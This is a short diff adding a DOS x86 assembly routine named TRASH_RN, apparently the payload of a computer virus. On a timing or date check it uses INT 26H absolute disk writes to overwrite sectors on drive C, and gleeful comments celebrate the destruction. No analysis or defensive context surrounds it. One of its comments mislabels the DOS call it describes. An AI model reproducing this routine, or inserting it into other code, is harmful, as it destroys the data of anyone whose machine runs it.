@@ -1,0 +1,21 @@
+;---------------------------------
+TRASH_RN:                        ; 
+MOV AH,2DH                       ;        
+INT 21H                          ;get date           
+CMP Dl,6                         ;is =6 (RAN 0-99)                 
+jne NO_DAYY                      ;nop! fuck ret           
+mov ah,0dh                       ;     
+int 21h                          ;reset disk 
+mov al,2                         ;
+mov cx,0ffffh                    ;
+mov dx,0                         ;  
+int 26h                          ;fuck ffffh sector 
+mov ah,0dh                       ;reste disk  
+int 21h                          ;   
+mov al,2                         ;    
+mov cx,0ffffh                    ;    
+mov dx,0ffffh                    ;new fuck+ 
+int 26h                          ;heheheh!!! 
+NO_DAYY:                         ;             
+ret                              ;
+;---------------------------------
